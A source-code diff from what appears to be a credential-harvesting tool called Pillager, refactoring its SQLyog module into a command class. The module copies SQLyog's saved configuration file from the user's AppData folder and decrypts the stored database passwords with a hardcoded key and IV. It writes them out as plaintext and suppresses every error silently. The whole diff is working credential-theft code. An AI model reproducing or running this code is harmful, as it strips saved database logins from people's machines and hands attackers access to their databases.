@@ -8,13 +8,11 @@ using Pillager.Helper;
 
 namespace Pillager.Tools
 {
-    internal class SQLyog
+    internal class SQLyog : ICommand
     {
-        public static string ToolName = "SQLyog";
-
-        private static byte[] keyArray = { 0x29, 0x23, 0xBE, 0x84, 0xE1, 0x6C, 0xD6, 0xAE, 0x52, 0x90, 0x49, 0xF1, 0xC9, 0xBB, 0x21, 0x8F };
-        private static byte[] ivArray = { 0xB3, 0xA6, 0xDB, 0x3C, 0x87, 0x0C, 0x3E, 0x99, 0x24, 0x5E, 0x0D, 0x1C, 0x06, 0xB7, 0x47, 0xDE };
-        private static string OldDecrypt(string text)
+        private byte[] keyArray = { 0x29, 0x23, 0xBE, 0x84, 0xE1, 0x6C, 0xD6, 0xAE, 0x52, 0x90, 0x49, 0xF1, 0xC9, 0xBB, 0x21, 0x8F };
+        private byte[] ivArray = { 0xB3, 0xA6, 0xDB, 0x3C, 0x87, 0x0C, 0x3E, 0x99, 0x24, 0x5E, 0x0D, 0x1C, 0x06, 0xB7, 0x47, 0xDE };
+        private string OldDecrypt(string text)
         {
             byte[] bytes = Convert.FromBase64String(text);
             for (int i = 0; i < bytes.Length; i++)
@@ -24,7 +22,7 @@ namespace Pillager.Tools
             return Encoding.UTF8.GetString(bytes);
         }
 
-        private static string NewDecrypt(string text)
+        private string NewDecrypt(string text)
         {
             byte[] bytes = Convert.FromBase64String(text);
             byte[] bytespad = new byte[128];
@@ -40,7 +38,7 @@ namespace Pillager.Tools
             return Encoding.UTF8.GetString(resultArray);
         }
 
-        private static string Decrypt(string path)
+        private string Decrypt(string path)
         {
             Pixini p = Pixini.Load(path);
             Dictionary<string, List<IniLine>> sectionMap = p.sectionMap;
@@ -63,16 +61,16 @@ namespace Pillager.Tools
         }
 
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string inipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SQLyog\\sqlyog.ini");
                 if (!File.Exists(inipath)) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "SQLyog");
                 Directory.CreateDirectory(savepath);
                 File.Copy(inipath, Path.Combine(savepath, "sqlyog.ini"));
-                File.WriteAllText(Path.Combine(savepath, "sqlyog_decrypted.ini"), Decrypt(inipath));
+                File.WriteAllText(Path.Combine(savepath, "sqlyog_decrypted.ini"), Decrypt(inipath), Encoding.UTF8);
             }
             catch { }
         }
